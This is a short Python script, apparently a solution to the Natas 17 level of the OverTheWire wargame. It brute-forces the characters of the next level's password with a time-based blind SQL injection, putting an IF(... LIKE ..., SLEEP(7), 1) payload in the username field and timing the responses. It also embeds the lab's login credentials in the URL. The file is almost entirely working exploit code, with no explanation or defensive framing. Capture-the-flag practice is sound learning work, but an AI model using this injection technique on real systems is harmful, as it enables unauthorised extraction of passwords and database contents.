import requests
import time

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
s = requests.Session()
result = ''

for i in alphabet:
	t = time.time()
	data = {'username': 'natas18"AND IF(password LIKE "%'+i+'%",SLEEP(7), 1) -- '}
	r = s.post(URL,data=data)
	if((time.time() - t) > 5):
		result = result + i
		print(result)
	time.sleep(2)